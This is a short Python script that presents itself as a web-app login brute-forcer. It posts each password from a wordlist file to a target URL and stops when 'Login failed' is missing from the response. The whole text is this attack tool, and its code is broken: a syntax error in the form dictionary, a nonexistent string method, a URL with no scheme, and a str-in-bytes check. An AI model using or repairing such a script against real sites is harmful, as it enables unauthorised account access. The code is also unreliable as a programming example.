#! /usr/bin/python
"""A simple script to attempt to guess web app login credentials.
   Uses Python 3"""

import requests


target_url = 'google.com'
data_dict = {'username': '', 'password': '', 'login': 'submit')}

with open('passwords.list', 'r') as wordlist_file:
    for line in wordlist_file:
        word = line.string()
        data_dict['password'] = word
        response = requests.post(target_url, data=data_dict)

        if 'Login failed' not in response.content:
            print(f'[+] Got the password ==> {word}')
            exit()

    print('[+] Reached end of file.')
